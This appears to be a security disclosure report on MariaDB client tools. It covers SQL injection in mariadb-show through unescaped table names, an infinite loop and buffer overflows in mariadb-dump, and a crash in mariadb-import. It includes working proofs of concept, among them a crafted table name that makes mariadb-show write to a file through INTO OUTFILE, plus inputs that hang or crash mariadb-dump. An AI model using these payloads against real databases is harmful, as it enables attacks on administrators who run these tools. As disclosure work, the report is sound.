vulnerability_information:
`mariadb-show` (and to a lesser extent `mariadb-dump` and `mariadb-convert-table-format.sh`) may be tricked into executing malicious SQL if run against an attacker controlled database due to dynamically generated queries not escaping user controlled values.

`mariadb-dump` contains additional issues that may lead to client-side DoS / buffer overflow issues.


## mariadb-show --count --verbose

`mariadb-show` may EXECUTE malicious queries when used as above because table names returned from `SHOW TABLES` end up being used without escaping in a ``SELECT COUNT(*) FROM `%s`;`` query.

[client/mysqlshow.c](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L606-L623)
```c++
/* Print the count of rows for each table */
my_snprintf(query, sizeof(query), "SELECT COUNT(*) FROM `%s`",
            row[0]);

if (!(mysql_query(mysql,query)))
...
```

additional potential sinks:
 - [client/mysqlshow.c:466](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L466-L467)
 - [client/mysqlshow.c:725](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L725)
 - [client/mysqlshow.c:738](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L738)
 - [client/mysqlshow.c:762](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L762)


### Proof of Concept

```sql
CREATE TABLE poc(i INT);
INSERT INTO poc VALUES (1), (2), (3);

CREATE TABLE `poc`` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#`(i INT);

SHOW TABLES;
-- poc
-- poc` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#
```

`mariadb-show` can then be tricked into executing

```sql
SELECT COUNT(*) FROM `poc` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#`
```

> ```
> root@localhost
> ```


## mariadb-convert-table-format.sh

Table names are also not escaped in `mariadb-convert-table-format.sh`, but the `SHOW TABLE STATUS` injection doesn't give a lot of room for an attacker to player with. It's possible to inject a single quote `'` or `LIKE` wildcards if needed.

[scripts/mysql_convert_table_format.sh:99](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/scripts/mysql_convert_table_format.sh#L99)
```perl
$sth=$dbh->prepare("show table status like '$table'");
```

```sql
CREATE TABLE `poc`(
  id INT
) ENGINE=MyISAM;

CREATE TABLE `poc%`(
  id INT
) ENGINE=InnoDB;
```

`mariadb-convert-table-format --engine=MYISAM --verbose ...`

> ```
> Converting tables:
> poc already uses the 'MYISAM' engine;  Ignored
> poc% already uses the 'MYISAM' engine;  Ignored
> ```


## mariadb-dump --system=servers

[client/mysqldump.cc:5241](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L5241)
```c++
my_snprintf(buff, sizeof(buff), "show create server %s", row[0]);
```

```
CREATE SERVER `poc`
  FOREIGN DATA WRAPPER mysql
  OPTIONS (HOST '127.0.0.1', DATABASE 'base_db');

CREATE SERVER `poc # hidden`
  FOREIGN DATA WRAPPER mysql
  OPTIONS (HOST '192.0.2.123', DATABASE 'hidden_db');
```

Because the `SHOW CREATE SERVER` doesn't quote server names, anything with a space in cause an injection. Not very useful ... but it's there.


## mariadb-dump --events (infinite loop)

`mariadb-dump --events` tries to create a delimiter not present in the event body, but because `create_delimiter()` increments `delimiter_max_size` instead of `proposed_length` during the loop, the proposed delimiter is always stuck as `;;` - causing an infinite loop if `;;` is already present.

[client/mysqldump.cc:2674](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L2674-L2695)
```c++
static char *create_delimiter(char *query, char *delimiter_buff, 
                              int delimiter_max_size) 
{
  int proposed_length;
  char *presence;


  delimiter_buff[0]= ';';  /* start with one semicolon, and */


  for (proposed_length= 2; proposed_length < delimiter_max_size; 
      delimiter_max_size++) {


    delimiter_buff[proposed_length-1]= ';';  /* add semicolons, until */
    delimiter_buff[proposed_length]= '\0';


    presence = strstr(query, delimiter_buff);
    if (presence == NULL) { /* the proposed delimiter is not in the query. */
       return delimiter_buff;
    }


  }
  return NULL;  /* but if we run out of space, return nothing at all. */
}
```

### Proof of Concept

```sql
CREATE EVENT e_low_hang
ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 1 DAY
DO SELECT ';;' AS marker;
```

```
$ mariadb-dump --events ...
...
--
-- Dumping events for database 'victimdb'
--
/*!50106 SET @save_time_zone= @@TIME_ZONE */ ;
/*!50106 DROP EVENT IF EXISTS `e_low_hang` */;
^C
```


## mariadb-dump (Buffer Overflows)

There are a couple of places where queries relating to users are copied into buffers that are potentially too small if the `'user'@'host'` is long enough (doesn't have to be max length, overflows well before then). Doesn't seem to be overly exploitable at first glance.

[client/mysqldump.cc:4959](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L4959-L4982)
```c++
if (mysql_query_with_error_report(mysql, &tableres,
                                  "SELECT CONCAT(QUOTE(u.user), '@', QUOTE(u.Host)) AS u "
                                  "FROM mysql.user u "
                                  " /*...*/"))
  return 1;
while ((row= mysql_fetch_row(tableres)))
{
  char buf[200];
  if (opt_replace_into)
    fprintf(md_result_file,
      "...",
      quote_for_equal(row[0],buf), ...);
  ...
```

[client/mysqldump.cc:2307](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L2307-L2325)
```c++
static char *quote_for_equal(const char *name, char *buff)
{
  char *to= buff;
  *to++= '\'';
  while (*name)
  {
    if (*name == '\\')
    {
      *to++='\\';
    }
    if (*name == '\'')
      *to++= '\'';
    *to++= *name++;
  }
  to[0]= '\'';
  to[1]= 0;
  return buff;


}
```

```sql
CREATE USER 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'@'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
```

```
$ mariadb-dump --system=users --replace ...
...
DROP ROLE mariadb_dump_import_role;
/*M!100203 EXECUTE IMMEDIATE CONCAT('SET ROLE ', @current_role) */;
zsh: abort ...
```

`mariadb-dump` also appears to overflow some buffers while dumping a view whose definer is excessively large. The overflow seems to get caught on an ASAN build, doesn't crash a release build, but these buffers (maybe elsewhere too?) should probably be increased now that longer username / hosts are accepted?


[client/mysqldump.cc:7192](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L7192-L7219)
```c++
char search_buf[256], replace_buf[256];
...

parse_user(row[1], lengths[1], user_name_str, &user_name_len,
           host_name_str, &host_name_len);

ptr= search_buf;
search_len=
  (ulong)(strxmov(ptr, "DEFINER=",
                  quote_name(user_name_str, quoted_user_name_str, FALSE),
                  "@",
                  quote_name(host_name_str, quoted_host_name_str, FALSE),
                  " SQL SECURITY ", row[2], NullS) - ptr);
...
```


## (BONUS BUG) mariadb-import

`mariadb-import --lock-tables` crashes the client for ordinary direct-file imports. The root cause is that the direct-file branch iterates `argv` to build `files_to_load`, leaving `argv` pointing at the final `NULL`.

The later `--lock-tables` path still passes the original remaining argument count plus the now-exhausted pointer to `lock_table()`, which then calls `fn_format()` with a `NULL` filename.

[client/mysqlimport.cc:L1318](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlimport.cc#L1318-L1322)
```c++
for (; *argv != NULL; argv++)
{
  table_load_params p(*argv, "", current_db, 0);
  files_to_load.push_back(p);
}
...

if (lock_tables)
  lock_table(mysql, argc, argv);
```

[client/mysqlimport.cc:840](https://github.com/MariaDB/server/blob/main/client/mysqlimport.cc#L840-L857)
```c++
static void lock_table(MYSQL *mysql, int tablecount, char **raw_tablename)
{
  ...

  for (i=0 ; i < tablecount ; i++)
  {
    fn_format(tablename, raw_tablename[i], "", "", 1 | 2);
    dynstr_append(&query, tablename);
    dynstr_append(&query, " WRITE,");
  }
  ...
```

and ...

```
$ mariadb-import --lock-tables db /tmp/x.txt
zsh: segmentation fault
```

## Impact

`mariadb-show --count` may EXECUTE attacker-injected SQL if ran against an attacker controlled db.
